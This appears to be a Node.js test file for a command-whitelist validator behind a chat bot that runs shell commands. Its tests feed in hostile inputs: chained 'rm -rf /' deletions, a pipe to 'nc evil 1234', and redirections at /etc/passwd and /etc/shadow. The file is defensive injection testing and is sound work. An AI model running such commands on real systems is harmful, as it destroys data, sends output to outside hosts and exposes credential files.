/**
 * Unit tests for the whitelist module.
 *
 * These cover the cases called out in the task spec:
 *   - empty string
 *   - subshell-injection attempts (e.g. `uptime; rm -rf /`)
 *   - newline-injection attempts (`uptime\nrm -rf /`)
 *   - command substitution, redirection, globbing, ...
 *
 * We use node:test (built-in since Node 20) to avoid external test deps.
 */

'use strict';

const test = require('node:test');
const assert = require('node:assert');

const {
  validateCommand,
  isNumberWhitelisted,
  isGroupMessage,
  FORBIDDEN_PATTERN,
} = require('../src/whitelist');

const WHITELIST = [
  { name: 'uptime', command: 'uptime', description: '' },
  { name: 'disk', command: 'df -h', description: '' },
  { name: 'docker-ps', command: 'docker ps', description: '' },
];

test('whitelist: exact match against whitelisted command succeeds', () => {
  const r = validateCommand('uptime', WHITELIST);
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.entry.name, 'uptime');
});

test('whitelist: exact multi-word command matches', () => {
  const r = validateCommand('df -h', WHITELIST);
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.entry.name, 'disk');
});

test('whitelist: empty string is rejected', () => {
  const r = validateCommand('', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'empty');
});

test('whitelist: whitespace-only string is rejected', () => {
  const r = validateCommand('   \t  ', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'empty');
});

test('whitelist: non-string input is rejected', () => {
  const r = validateCommand(123, WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'not_a_string');
});

test('whitelist: subshell injection via semicolon is rejected', () => {
  const r = validateCommand('uptime; rm -rf /', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: subshell injection via && is rejected', () => {
  const r = validateCommand('uptime && rm -rf /', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: pipe injection is rejected', () => {
  const r = validateCommand('uptime | nc evil 1234', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: newline injection is rejected', () => {
  const r = validateCommand('uptime\nrm -rf /', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'multiline');
});

test('whitelist: CRLF injection is rejected', () => {
  const r = validateCommand('uptime\r\nrm -rf /', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'multiline');
});

test('whitelist: command substitution via $() is rejected', () => {
  const r = validateCommand('echo $(whoami)', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: command substitution via backticks is rejected', () => {
  const r = validateCommand('echo `whoami`', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: output redirection is rejected', () => {
  const r = validateCommand('uptime > /etc/passwd', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: input redirection is rejected', () => {
  const r = validateCommand('cat < /etc/shadow', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: globbing is rejected', () => {
  const r = validateCommand('ls *', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: subshell parens are rejected', () => {
  const r = validateCommand('echo (whoami)', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'forbidden_chars');
});

test('whitelist: unknown but clean command is rejected with unknown_command', () => {
  const r = validateCommand('reboot', WHITELIST);
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'unknown_command');
});

test('whitelist: leading/trailing whitespace is trimmed', () => {
  const r = validateCommand('   uptime   ', WHITELIST);
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.entry.name, 'uptime');
});

test('whitelist: malformed whitelisted commands are skipped safely', () => {
  const dirty = [
    { name: 'a', command: 'uptime; bad' }, // shouldn't match anything
    { name: 'b', command: 'docker ps' },
    null,
    'not an object',
  ];
  const r = validateCommand('docker ps', dirty);
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.entry.name, 'b');
});

test('FORBIDDEN_PATTERN covers all listed metacharacters', () => {
  const samples = [';', '&', '|', '`', '$', '<', '>', '*', '?', '(', ')', '{', '}', '\\', '\n', '\r', '\t'];
  for (const ch of samples) {
    assert.ok(FORBIDDEN_PATTERN.test(ch), `expected to forbid ${JSON.stringify(ch)}`);
  }
});

// ---------------------------------------------------------------------------
// isNumberWhitelisted
// ---------------------------------------------------------------------------

test('isNumberWhitelisted: exact match', () => {
  assert.strictEqual(isNumberWhitelisted('491701234567', ['491701234567']), true);
});

test('isNumberWhitelisted: non-whitelisted number', () => {
  assert.strictEqual(isNumberWhitelisted('491709999999', ['491701234567']), false);
});

test('isNumberWhitelisted: strips non-digits defensively', () => {
  assert.strictEqual(isNumberWhitelisted('+49 170 1234567', ['491701234567']), true);
});

test('isNumberWhitelisted: empty string rejected', () => {
  assert.strictEqual(isNumberWhitelisted('', ['491701234567']), false);
});

test('isNumberWhitelisted: non-string input rejected', () => {
  assert.strictEqual(isNumberWhitelisted(undefined, ['491701234567']), false);
  assert.strictEqual(isNumberWhitelisted(null, ['491701234567']), false);
});

// ---------------------------------------------------------------------------
// isGroupMessage
// ---------------------------------------------------------------------------

test('isGroupMessage: detects @g.us suffix on msg.from', () => {
  assert.strictEqual(isGroupMessage({ from: '120363@g.us' }), true);
});

test('isGroupMessage: detects @g.us suffix on msg.id.remote', () => {
  assert.strictEqual(isGroupMessage({ id: { remote: '120363@g.us' } }), true);
});

test('isGroupMessage: returns false for 1:1 chat', () => {
  assert.strictEqual(isGroupMessage({ from: '491701234567@c.us' }), false);
});

test('isGroupMessage: returns false on null', () => {
  assert.strictEqual(isGroupMessage(null), false);
});